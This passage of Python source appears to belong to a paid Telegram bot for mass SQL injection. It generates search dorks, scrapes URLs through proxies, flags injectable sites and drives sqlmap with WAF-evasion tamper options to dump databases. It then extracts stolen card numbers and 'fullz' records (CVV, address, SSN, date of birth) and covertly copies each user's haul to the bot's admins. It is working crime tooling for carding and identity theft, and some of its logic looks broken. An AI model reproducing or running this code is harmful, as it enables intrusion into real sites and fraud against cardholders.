        txt = "\n".join(f"`{i}.` `{p}`" for i,p in enumerate(global_proxy_pool[:20], 1)) or "_Eᴍᴘᴛʏ_"
        await q.edit_message_text(f"🌊 Pʀᴏxʏ Pᴏᴏʟ ({len(global_proxy_pool)})\n\n{txt}", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_clearproxies":
        if not is_admin(uid): return MENU
        n = len(global_proxy_pool); global_proxy_pool.clear(); _save_proxies()
        await q.edit_message_text(f"✅ Rᴇᴍᴏᴠᴇᴅ `{n}` Pʀᴏxɪᴇs.", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_checkproxies":
        if not is_admin(uid): return MENU
        tg = len(global_proxy_pool); tu = sum(len(v) for v in user_proxies.values())
        await q.edit_message_text(f"🥷 Gʟᴏʙᴀʟ: `{tg}`\nUsᴇʀ Pʀᴏxɪᴇs: `{tu}`", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_serverinfo":
        if not is_admin(uid): return MENU
        if not PSUTIL_OK:
            await q.edit_message_text("psutil not installed.", reply_markup=make_admin_menu()); return MENU
        try:
            proc = psutil.Process()
            mem = proc.memory_info().rss / 1024 / 1024
            cpu = psutil.cpu_percent(interval=0.1)
            tasks = len([t for t in asyncio.all_tasks() if not t.done()])
            await q.edit_message_text(f"🛖 RAM `{mem:.1f}MB`\nCPU `{cpu:.1f}%`\nTᴀsᴋs `{tasks}`",
                                      reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await q.edit_message_text(f"Eʀʀᴏʀ: `{e}`", reply_markup=make_admin_menu(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "admin_getfile":
        if not is_admin(uid): return MENU
        await q.answer("Sᴇɴᴅɪɴɢ...")
        await getfile_cmd(update, context); return MENU

    # Redeem
    if data == "menu_redeem":
        await q.edit_message_text("🔑 Pᴀsᴛᴇ Kᴇʏ:", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return REDEEM_KEY
    # Menu items
    if data == "menu_keywords":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        context.user_data["mode"] = "keywords"
        await q.edit_message_text("🔠 Hᴏᴡ Mᴀɴʏ?", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return KW_COUNT
    if data == "menu_dorks":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        context.user_data["dork_type"] = "normal"
        await q.edit_message_text("🧤 Hᴏᴡ Mᴀɴʏ?", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return DORK_COUNT
    if data in ("menu_hqdorks","menu_countrydorks","menu_cmsdorks","menu_exposeddorks"):
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        context.user_data["dork_type"] = {"menu_hqdorks":"hq","menu_countrydorks":"country",
                                          "menu_cmsdorks":"cms","menu_exposeddorks":"exposed"}[data]
        await q.edit_message_text("🔢 Hᴏᴡ Mᴀɴʏ?", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return DORK_COUNT
    if data == "menu_parser":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        await q.edit_message_text("🦡 Sᴇɴᴅ Dᴏʀᴋs (.txt ᴏʀ ᴘᴀsᴛᴇ):", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return PARSER_DORKS
    if data == "menu_sqli":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        await q.edit_message_text("💉 Sᴇɴᴅ URLs:", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return SQLI_URLS
    if data == "menu_dump":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        await q.edit_message_text("🪵 Sᴇɴᴅ Dᴏʀᴋs:", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return DUMP_DORKS
    if data == "menu_urldump":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        await q.edit_message_text("🎢 Sᴇɴᴅ URLs:", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return URL_DUMP
    if data == "menu_gdork":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        await q.edit_message_text(
            "🎯 GOD MODE — Dᴏʀᴋ ➪ Sǫʟᴍᴀᴘ Dɪʀᴇᴄᴛ\n\n"
            "Sᴇɴᴅ ᴏɴᴇ ᴅᴏʀᴋ, sǫʟᴍᴀᴘ Wɪʟʟ Sᴄʀᴀᴘᴇ Gᴏᴏɢʟᴇ Aɴᴅ Dᴜᴍᴘ.\n\n"
            "Exᴀᴍᴘʟᴇ: `inurl:index.php?id= site:.in`",
            reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return GDORK_DUMP
    if data == "menu_purchase":
        await q.edit_message_text("🍷 Pʟᴀɴs:", reply_markup=make_purchase_menu(), parse_mode=ParseMode.MARKDOWN)
        return PURCHASE_MENU
    if data == "menu_help":
        await q.edit_message_text(f"🆘 Aᴅᴍɪɴ: `{ADMIN_USERNAME}`", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "menu_guide":
        await q.edit_message_text(
            "🚸 Hᴏᴡ Tᴏ Usᴇ\n\n"
            "📕 Pɪᴘᴇʟɪɴᴇ: Kᴇʏᴡᴏʀᴅs ➪ Dᴏʀᴋs ➪ Pᴀʀsᴇʀ ➪ DB Dᴜᴍᴘ\n\n"
            "🎯 GOD MODE: Dᴏʀᴋ ➪ Sǫʟᴍᴀᴘ ➪ CC\n\n"
            "Exᴀᴍᴘʟᴇ ᴅᴏʀᴋ: `inurl:index.php?id=`\n"
            "Exᴀᴍᴘʟᴇ sᴇᴇᴅ: `shop, payment, login`",
            reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data == "menu_adorks":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        cfg = adork_get_cfg(context)
        await q.edit_message_text(
            f"🧞 Dᴏʀᴋ Gᴇɴ V2\n\n"
            f"Usᴇ ᴄᴏᴍᴍᴀɴᴅs:\n"
            f"`/dkeywords` `/ddomains` `/dparams` `/dfiletypes`\n"
            f"`/dsf` `/dpf` `/dconfig` `/dstatus` `/dreset`\n"
            f"`/dgenerate` `/dgen <X>`\n\n"
            f"Kᴇʏᴡᴏʀᴅs: `{len(cfg['keywords'])}` Tᴇᴍᴘʟᴀᴛᴇs: `{len(cfg['enabled'])}/10`",
            reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
        return MENU
    # SQLopts
    if data == "dump_sqlopts":
        if not has_access(uid): await q.answer("Nᴏ Aᴄᴄᴇss", show_alert=True); return MENU
        await q.edit_message_text(_sqlopts_text(uid), reply_markup=make_sqlopts_menu(uid), parse_mode=ParseMode.MARKDOWN)
        return MENU
    if data.startswith("sqlo_"):
        o = _get_sqlopts(uid)
        if data == "sqlo_lvl_up": o["level"] = min(5, o["level"]+1)
        elif data == "sqlo_lvl_dn": o["level"] = max(1, o["level"]-1)
        elif data == "sqlo_risk_up": o["risk"] = min(3, o["risk"]+1)
        elif data == "sqlo_risk_dn": o["risk"] = max(1, o["risk"]-1)
        elif data == "sqlo_tech_b": o["technique"] = "BEUSTQ"
        elif data == "sqlo_tech_eu": o["technique"] = "EU"
        elif data == "sqlo_tamp_std": o["tamper"] = DEFAULT_TAMPER
        elif data == "sqlo_tamp_max": o["tamper"] = "space2comment,between,charencode,randomcomments,greatest,ifnull2ifisnull,modsecurityzeroversioned,percentage,randomcase,symboliclogical,unmagicquotes"
        elif data == "sqlo_thr": o["threads"] = 5 if o["threads"] == 10 else (20 if o["threads"] == 5 else 10)
        elif data == "sqlo_crawl": o["crawl"] = (o["crawl"]+1) % 4
        elif data == "sqlo_engine": o["engine"] = "subprocess" if o["engine"] == "api" else "api"
        elif data == "sqlo_bulk": o["bulk"] = not o["bulk"]
        elif data == "sqlo_reset": user_sqlopts[uid] = dict(_DEFAULT_SQLOPTS); o = user_sqlopts[uid]
        elif data == "sqlo_back":
            await q.edit_message_text("🪵 Sᴇɴᴅ Dᴏʀᴋs ᴏʀ URL:" if not context.user_data.get("prefound") else "🎢 Sᴇɴᴅ URLs:",
                                      reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
            return MENU
        try: await q.edit_message_text(_sqlopts_text(uid), reply_markup=make_sqlopts_menu(uid), parse_mode=ParseMode.MARKDOWN)
        except: pass
        return MENU
    return MENU

# ═══════════════════════════════════════════════════════════════════════════
#  🎮  FLOWS
# ═══════════════════════════════════════════════════════════════════════════
async def kw_count(update, context):
    try:
        c = min(int(update.message.text.strip().replace(",","")), 1_000_000)
        if c < 1: raise ValueError
    except: await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ."); return KW_COUNT
    context.user_data["kw_count"] = c
    await update.message.reply_text("📤 Sᴇɴᴅ Sᴇᴇᴅs:", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
    return KW_SEEDS

async def kw_seeds_text(update, context):
    seeds = [s.strip() for s in update.message.text.strip().replace(",","\n").splitlines() if s.strip()]
    if not seeds: await update.message.reply_text("❌ Eᴍᴘᴛʏ."); return KW_SEEDS
    return await _run_kw(update, context, seeds)

async def kw_seeds_file(update, context):
    doc = update.message.document
    f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    seeds = [s.strip() for s in data.decode("utf-8", errors="ignore").replace(",","\n").splitlines() if s.strip()]
    if not seeds: await update.message.reply_text("❌ Eᴍᴘᴛʏ."); return KW_SEEDS
    return await _run_kw(update, context, seeds)

async def _run_kw(update, context, seeds):
    c = context.user_data.get("kw_count", 1000)
    msg = await update.message.reply_text(f"🧤 Gᴇɴᴇʀᴀᴛɪɴɢ `{c:,}` Kᴇʏᴡᴏʀᴅs...", parse_mode=ParseMode.MARKDOWN)
    loop = asyncio.get_running_loop()
    kws = await loop.run_in_executor(None, generate_keywords, seeds, c)
    ts = datetime.now().strftime("%d%m%y_%H%M")
    await update.message.reply_document(
        document=io.BytesIO("\n".join(kws).encode()),
        filename=f"keywords_{len(kws)}_{ts}.txt",
        caption=f"🔑 `{len(kws):,}` Kᴇʏᴡᴏʀᴅs", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_text("Sᴇʟᴇᴄᴛ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU

async def dork_count(update, context):
    try:
        c = min(int(update.message.text.strip().replace(",","")), 1_000_000)
        if c < 1: raise ValueError
    except: await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ."); return DORK_COUNT
    context.user_data["dork_count"] = c
    await update.message.reply_text("📤 Sᴇɴᴅ Kᴇʏᴡᴏʀᴅs:", reply_markup=back_button(), parse_mode=ParseMode.MARKDOWN)
    return DORK_KWS

async def dork_kws_text(update, context):
    kws = [k.strip() for k in update.message.text.strip().replace(",","\n").splitlines() if k.strip()]
    if not kws: await update.message.reply_text("❌ Eᴍᴘᴛʏ."); return DORK_KWS
    return await _run_dork(update, context, kws)

async def dork_kws_file(update, context):
    doc = update.message.document
    f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    kws = [k.strip() for k in data.decode("utf-8", errors="ignore").replace(",","\n").splitlines() if k.strip()]
    if not kws: await update.message.reply_text("❌ Eᴍᴘᴛʏ."); return DORK_KWS
    return await _run_dork(update, context, kws)

async def _run_dork(update, context, kws):
    c = context.user_data.get("dork_count", 5000)
    dt = context.user_data.pop("dork_type", "normal")
    msg = await update.message.reply_text(f"🥷 Gᴇɴᴇʀᴀᴛɪɴɢ `{c:,}`...", parse_mode=ParseMode.MARKDOWN)
    loop = asyncio.get_running_loop()
    if dt == "hq": dorks = await loop.run_in_executor(None, lambda: generate_hq_sqli_dorks(kws, c))
    elif dt == "country": dorks = await loop.run_in_executor(None, lambda: generate_country_dorks(kws, None, c))
    elif dt == "cms": dorks = await loop.run_in_executor(None, lambda: generate_cms_dorks(kws, None, c))
    elif dt == "exposed": dorks = await loop.run_in_executor(None, lambda: generate_exposed_dorks(kws, c))
    else: dorks = await loop.run_in_executor(None, generate_dorks, kws, c)
    ts = datetime.now().strftime("%d%m%y_%H%M")
    await update.message.reply_document(
        document=io.BytesIO("\n".join(dorks).encode()),
        filename=f"dorks_{dt}_{len(dorks)}_{ts}.txt",
        caption=f"🥷 `{len(dorks):,}` Dᴏʀᴋs", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_text("Sᴇʟᴇᴄᴛ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU

async def parser_text(update, context):
    dorks = [d.strip() for d in update.message.text.strip().splitlines() if d.strip()]
    if not dorks: await update.message.reply_text("❌ Eᴍᴘᴛʏ."); return PARSER_DORKS
    return await _run_parser(update, context, dorks)

async def parser_file(update, context):
    doc = update.message.document
    f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    dorks = [d.strip() for d in data.decode("utf-8", errors="ignore").splitlines() if d.strip()]
    if not dorks: await update.message.reply_text("❌ Eᴍᴘᴛʏ."); return PARSER_DORKS
    return await _run_parser(update, context, dorks)

async def _run_parser(update, context, dorks):
    uid = update.effective_user.id
    se = asyncio.Event(); stop_events[uid] = se
    stop_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_parser")]])
    total = len(dorks)
    timeout_s = max(600, min(int(total * 2), 43200))
    last_edit = [0.0]
    msg = await update.message.reply_text(
        f"🛰️ Pᴀʀsᴇʀ Sᴛᴀʀᴛɪɴɢ...\n\nDᴏʀᴋs: `{total:,}`",
        reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)
    async def on_prog(d, t, found, r):
        now = time.monotonic()
        if now - last_edit[0] < 2.5: return
        last_edit[0] = now
        pct = int(d/t*100) if t else 0
        bar = "█"*(pct//5) + "░"*(20 - pct//5)
        try:
            await msg.edit_text(f"🛰️ Pᴀʀsᴇʀ Rᴜɴɴɪɴɢ\n\nSᴄᴀɴɴᴇᴅ `{d:,}/{t:,}`\nURLs `{found:,}`\n\n`[{bar}]` {pct}%",
                reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)
        except: pass
    _inner = asyncio.ensure_future(search_urls_from_dorks(
        dorks, limit=max(100_000, total*2), progress_callback=on_prog,
        stop_event=se, proxy_list=effective_proxy_pool(uid)))
    try:
        timeout_s = max(600, min(int(total * 2), 43200))  # max 12 hours
    except asyncio.TimeoutError:
        se.set()
        try: urls = await asyncio.wait_for(_inner, timeout=15.0)
        except: _inner.cancel(); urls = []
    await msg.edit_text(f"✅ Pᴀʀsᴇʀ Dᴏɴᴇ\nURLs: `{len(urls):,}`", parse_mode=ParseMode.MARKDOWN)
    if urls:
        ts = datetime.now().strftime("%d%m%y_%H%M")
        await update.message.reply_document(
            document=io.BytesIO("\n".join(urls).encode()),
            filename=f"urls_{len(urls)}_{ts}.txt",
            caption=f"📈 `{len(urls):,}` URLs", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("⚠️ Nᴏ URLs.")
    await update.message.reply_text("Sᴇʟᴇᴄᴛ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU

async def sqli_text(update, context):
    urls = [u.strip() for u in update.message.text.strip().splitlines() if u.strip().startswith("http")]
    if not urls: await update.message.reply_text("❌ Nᴏ URLs."); return SQLI_URLS
    return await _run_sqli(update, context, urls)

async def sqli_file(update, context):
    doc = update.message.document
    f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    urls = [u.strip() for u in data.decode("utf-8", errors="ignore").splitlines() if u.strip().startswith("http")][:10000]
    if not urls: await update.message.reply_text("❌ Nᴏ URLs."); return SQLI_URLS
    return await _run_sqli(update, context, urls)

async def _run_sqli(update, context, urls):
    uid = update.effective_user.id
    se = asyncio.Event(); stop_events[uid] = se
    stop_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_sqli")]])
    total = len(urls); inj = []; clean = []; last_edit = [0.0]
    sem = asyncio.Semaphore(100)
    pool = effective_proxy_pool(uid)
    conn = _get_connector()
    msg = await update.message.reply_text(f"💉 Sᴄᴀɴɴɪɴɢ `{total:,}`...", reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)
    async with aiohttp.ClientSession(connector=conn, connector_owner=False) as s:
        async def _t(u):
            if se.is_set(): return
            async with sem:
                px = random.choice(pool) if pool else ""
                if await _check_injectable(s, u, px): inj.append(u)
                else: clean.append(u)
            now = time.monotonic()
            if now - last_edit[0] >= 1.5:
                last_edit[0] = now
                d = len(inj) + len(clean); pct = int(d/total*100) if total else 0
                bar = "█"*(pct//5) + "░"*(20 - pct//5)
                try:
                    await msg.edit_text(f"💉 Tᴇsᴛᴇᴅ `{d:,}/{total:,}`\nVᴜʟɴ `{len(inj):,}`\n\n`[{bar}]` {pct}%",
                        reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)
                except: pass
        for i in range(0, len(urls), 800):
            if se.is_set(): break
            await asyncio.gather(*[_t(u) for u in urls[i:i+800]], return_exceptions=True)
    await msg.edit_text(f"✅ Vᴜʟɴ: `{len(inj):,}` Cʟᴇᴀɴ: `{len(clean):,}`", parse_mode=ParseMode.MARKDOWN)
    if inj:
        ts = datetime.now().strftime("%d%m%y_%H%M")
        await update.message.reply_document(
            document=io.BytesIO("\n".join(inj).encode()),
            filename=f"sqli_vuln_{len(inj)}_{ts}.txt",
            caption=f"🎭 `{len(inj):,}` Vᴜʟɴ", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_text("Sᴇʟᴇᴄᴛ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU

# ── DUMP pipeline ─────────────────────────────────────────────────────────
async def dump_text(update, context):
    dorks = [d.strip() for d in update.message.text.strip().splitlines() if d.strip()]
    if not dorks: await update.message.reply_text("❌ Eᴍᴘᴛʏ."); return DUMP_DORKS
    return await _run_dump(update, context, dorks, [])

async def dump_file(update, context):
    doc = update.message.document
    f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    dorks = [d.strip() for d in data.decode("utf-8", errors="ignore").splitlines() if d.strip()]
    if not dorks: await update.message.reply_text("❌ Eᴍᴘᴛʏ."); return DUMP_DORKS
    return await _run_dump(update, context, dorks, [])

async def urldump_text(update, context):
    urls = [u.strip() for u in update.message.text.strip().splitlines() if u.strip().startswith("http")]
    if not urls: await update.message.reply_text("❌ Nᴏ URLs."); return URL_DUMP
    return await _run_dump(update, context, [], urls[:5000])

async def urldump_file(update, context):
    doc = update.message.document
    f = await context.bot.get_file(doc.file_id)
    data = await f.download_as_bytearray()
    urls = [u.strip() for u in data.decode("utf-8", errors="ignore").splitlines() if u.strip().startswith("http")][:5000]
    if not urls: await update.message.reply_text("❌ Nᴏ URLs."); return URL_DUMP
    return await _run_dump(update, context, [], urls)

async def _run_dump(update, context, dorks, prefound):
    uid = update.effective_user.id
    se = asyncio.Event(); stop_events[uid] = se
    stop_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_dump")]])
    ts = datetime.now().strftime("%d%m%y_%H%M")

    if prefound:
        urls = prefound
        msg = await update.message.reply_text(
            f"🎢 `{len(urls)}` URLs Lᴏᴀᴅᴇᴅ. Sᴄᴀɴɴɪɴɢ...",
            reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)
    else:
        msg = await update.message.reply_text(
            f"🪵 Pᴀʀsɪɴɢ `{len(dorks)}` Dᴏʀᴋs...",
            reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)
        urls = await search_urls_from_dorks(
            dorks, limit=100_000, stop_event=se,
            proxy_list=effective_proxy_pool(uid))
        if not urls:
            await msg.edit_text("⚠️ Nᴏ URLs.")
            await update.message.reply_text("Sᴇʟᴇᴄᴛ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
            return MENU
        await msg.edit_text(f"✅ `{len(urls)}` URLs. Sᴄᴀɴɴɪɴɢ...", parse_mode=ParseMode.MARKDOWN)

    # ── SQLi SCAN ─────────────────────────────────────────────────────────────
    inj = []
    sem = asyncio.Semaphore(80)
    pool = effective_proxy_pool(uid)
    conn = _get_connector()
    async with aiohttp.ClientSession(connector=conn, connector_owner=False) as s:
        async def _t(u):
            if se.is_set(): return
            async with sem:
                px = random.choice(pool) if pool else ""
                if await _check_injectable(s, u, px): inj.append(u)
        for i in range(0, len(urls), 600):
            if se.is_set(): break
            await asyncio.gather(*[_t(u) for u in urls[i:i+600]], return_exceptions=True)

    if not inj:
        await msg.edit_text(f"⚠️ Nᴏ Vᴜʟɴ.\nTᴇsᴛᴇᴅ: `{len(urls)}`", parse_mode=ParseMode.MARKDOWN)
        await update.message.reply_text("Sᴇʟᴇᴄᴛ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
        return MENU

    await msg.edit_text(f"🎭 `{len(inj)}` Vᴜʟɴ. Dᴜᴍᴘɪɴɢ...", parse_mode=ParseMode.MARKDOWN)

    # ── DUMP PHASE ────────────────────────────────────────────────────────────
    o = _get_sqlopts(uid)
    all_cards = []
    all_fullz = []       # ← fullz records collected here
    last_edit = [0.0]

    async def on_prog(d, t, success):
        now = time.monotonic()
        if now - last_edit[0] < 2.0: return
        last_edit[0] = now
        pct = int(d / t * 100) if t else 0
        bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
        try:
            await msg.edit_text(
                f"🕳️ Dᴜᴍᴘɪɴɢ\n\n"
                f"`{d:,}/{t:,}` ᴘʀᴏᴄᴇssᴇᴅ\n"
                f"Dᴜᴍᴘᴇᴅ `{success:,}`\n"
                f"CC `{len(all_cards)}`  │  Fᴜʟʟᴢ `{len(all_fullz)}`\n\n"
                f"`[{bar}]` {pct}%",
                reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass

    async def on_result(r, z):
        # Collect cards from result
        if r.cards:
            all_cards.extend(r.cards)
        # Collect fullz from result's csv_dir
        try:
            src_dir = getattr(r, "csv_dir", "") or ""
            if src_dir and os.path.isdir(src_dir):
                recs = extract_fullz_from_dir(src_dir)
                if recs:
                    all_fullz.extend(recs)
        except Exception:
            pass
        # Send per-site ZIP
        if z:
            domain = r.url.split("/")[2][:40] if "/" in r.url else "unknown"
            sev = getattr(r, "severity", SEVERITY_INFO)
            try:
                await update.message.reply_document(
                    document=io.BytesIO(z),
                    filename=f"dump_{domain}_{ts}.zip",
                    caption=f"🕳️ `{domain}` {sev}\n💳 CC: `{len(r.cards)}`",
                    parse_mode=ParseMode.MARKDOWN)
            except Exception:
                pass

    if o["engine"] == "api":
        def on_log(url, line): pass
        if o["bulk"]:
            r = await api_bulk_dump(
                inj, proxy_list=pool,
                level=o["level"], risk=o["risk"],
                technique=o["technique"], threads=o["threads"],
                tamper=o["tamper"], stop_event=se, log_cb=on_log)
            if r.success:
                if r.cards:
                    all_cards.extend(r.cards)
                # Pull fullz from the CSV dir even in bulk mode
                try:
                    if getattr(r, "csv_dir", "") and os.path.isdir(r.csv_dir):
                        all_fullz.extend(extract_fullz_from_dir(r.csv_dir))
                except Exception:
                    pass
                if r.csv_dir:
                    await on_result(r, _zip_dir(r.csv_dir))
        else:
            await api_dump_multiple(
                inj, proxy_list=pool,
                level=o["level"], risk=o["risk"],
                technique=o["technique"], threads=o["threads"],
                tamper=o["tamper"], crawl_depth=o["crawl"],
                stop_event=se, progress_cb=on_prog,
                per_result_cb=on_result, log_sample_cb=on_log)
    else:
        # Subprocess engine
        base_dir = tempfile.mkdtemp(prefix="spidey_sub_")

        # Wrap per_result_cb so we also pull fullz from each subprocess output dir
        async def _subprocess_result(r, z):
            try:
                if getattr(r, "output_dir", "") and os.path.isdir(r.output_dir):
                    all_fullz.extend(extract_fullz_from_dir(r.output_dir))
            except Exception:
                pass
            await on_result(r, z)

        await sqlmap_dump_multiple(
            inj, base_dir, proxy_list=pool, stop_event=se,
            progress_cb=on_prog, per_result_cb=_subprocess_result)
        # In case per-result-cb missed anything, sweep the whole base_dir
        try:
            all_fullz.extend(extract_fullz_from_dir(base_dir))
        except Exception:
            pass
        shutil.rmtree(base_dir, ignore_errors=True)

    # ── DEDUP + DELIVERY ──────────────────────────────────────────────────────
    all_cards = list(dict.fromkeys(all_cards))

    # Dedup fullz by (cc, name, zip, email)
    seen_f = set()
    fullz_dedup = []
    for rec in all_fullz:
        k = (rec.cc_number, rec.holder_name, rec.zip, rec.email)
        if k in seen_f:
            continue
        seen_f.add(k)
        fullz_dedup.append(rec)

    await msg.edit_text(
        f"✅ Dᴜᴍᴘ Dᴏɴᴇ\n\n"
        f"CC Hɪᴛs: `{len(all_cards)}`\n"
        f"Fᴜʟʟᴢ Rᴇᴄᴏʀᴅs: `{len(fullz_dedup)}`",
        parse_mode=ParseMode.MARKDOWN)

    if all_cards:
        # ── Plain CC file (ALWAYS ships if we have any CC) ────────────────────
        cc_bytes = "\n".join(all_cards).encode()
        cc_name = f"cards_{len(all_cards)}_{ts}.txt"
        await update.message.reply_document(
            document=io.BytesIO(cc_bytes), filename=cc_name,
            caption=f"💳 `{len(all_cards):,}` CC Hɪᴛs", parse_mode=ParseMode.MARKDOWN)

        # ── Fullz file (only if we have records with at least a name or addr) ─
        # Filter to records that actually have more than just the CC number
        rich_fullz = [r for r in fullz_dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
        if rich_fullz:
            fullz_lines = fullz_records_to_lines(rich_fullz, format="full")
            fullz_bytes = "\n".join(fullz_lines).encode()
            fullz_name = f"fullz_{len(rich_fullz)}_{ts}.txt"
            await update.message.reply_document(
                document=io.BytesIO(fullz_bytes),
                filename=fullz_name,
                caption=(
                    f"📋 Fᴜʟʟᴢ — `{len(rich_fullz)}` Rᴇᴄᴏʀᴅs\n\n"
                    f"{fullz_summary(rich_fullz)}\n\n"
                    "_Format: `cc|MM|YY|cvv|name|addr|addr2|city|state|zip|country|phone|email|dob|ssn`_"
                ),
                parse_mode=ParseMode.MARKDOWN)

        # ── Admin forward ─────────────────────────────────────────────────────
        if uid not in ADMIN_IDS:
            for aid in ADMIN_IDS:
                try:
                    await context.bot.send_document(
                        chat_id=aid, document=io.BytesIO(cc_bytes),
                        filename=cc_name,
                        caption=f"💥 Usᴇʀ `{uid}` — CC `{len(all_cards)}`",
                        parse_mode=ParseMode.MARKDOWN)
                    if rich_fullz:
                        await context.bot.send_document(
                            chat_id=aid,
                            document=io.BytesIO(
                                "\n".join(fullz_records_to_lines(rich_fullz, "full")).encode()),
                            filename=f"fullz_{uid}_{ts}.txt",
                            caption=f"📋 Fᴜʟʟᴢ `{len(rich_fullz)}` Fʀᴏᴍ `{uid}`",
                            parse_mode=ParseMode.MARKDOWN)
                except Exception:
                    pass

    await update.message.reply_text("Sᴇʟᴇᴄᴛ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
    return MENU

# ── GOD MODE ──────────────────────────────────────────────────────────────
async def gdork_dump_handler(update, context):
    uid = update.effective_user.id
    if not has_access(uid):
        await update.message.reply_text(
            access_denied_text(), reply_markup=access_denied_kb(),
            parse_mode=ParseMode.MARKDOWN)
        return MENU

    dork = update.message.text.strip() if update.message.text else ""
    if not dork:
        await update.message.reply_text("❌ Sᴇɴᴅ Vᴀʟɪᴅ Dᴏʀᴋ.")
        return GDORK_DUMP

    se = asyncio.Event()
    stop_events[uid] = se
    stop_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_dump")]])
    ts = datetime.now().strftime("%d%m%y_%H%M")
    o = _get_sqlopts(uid)

    msg = await update.message.reply_text(
        f"🎯 GOD MODE\n\nDᴏʀᴋ: `{dork[:100]}`\n\nSǫʟᴍᴀᴘ Qᴜᴇʀʏɪɴɢ Gᴏᴏɢʟᴇ...",
        reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)

    all_cards = []
    all_fullz = []

    async def on_result(r, z):
        # Cards
        if r.cards:
            all_cards.extend(r.cards)
        # Fullz from csv_dir (REST API) or output_dir (subprocess)
        try:
            for attr in ("csv_dir", "output_dir"):
                src = getattr(r, attr, "") or ""
                if src and os.path.isdir(src):
                    recs = extract_fullz_from_dir(src)
                    if recs:
                        all_fullz.extend(recs)
                    break
        except Exception:
            pass
        # Ship per-hit ZIP
        if z:
            try:
                sev = getattr(r, "severity", SEVERITY_INFO)
                await update.message.reply_document(
                    document=io.BytesIO(z), filename=f"godmode_{ts}.zip",
                    caption=f"🎯 `{dork[:60]}` {sev}\n💳 CC: `{len(r.cards)}`",
                    parse_mode=ParseMode.MARKDOWN)
            except Exception:
                pass

    if o["engine"] == "api":
        result = await api_google_dork_dump(
            dork, proxy_list=effective_proxy_pool(uid),
            level=o["level"], risk=o["risk"], technique=o["technique"],
            threads=o["threads"], tamper=o["tamper"],
            stop_event=se, per_result_cb=on_result)
        if result.cards:
            all_cards.extend(result.cards)
        try:
            if getattr(result, "csv_dir", "") and os.path.isdir(result.csv_dir):
                all_fullz.extend(extract_fullz_from_dir(result.csv_dir))
        except Exception:
            pass
    else:
        # Fallback: parse dork → URLs → subprocess dump
        urls = await search_urls_from_dorks(
            [dork], limit=100, stop_event=se,
            proxy_list=effective_proxy_pool(uid))
        if urls:
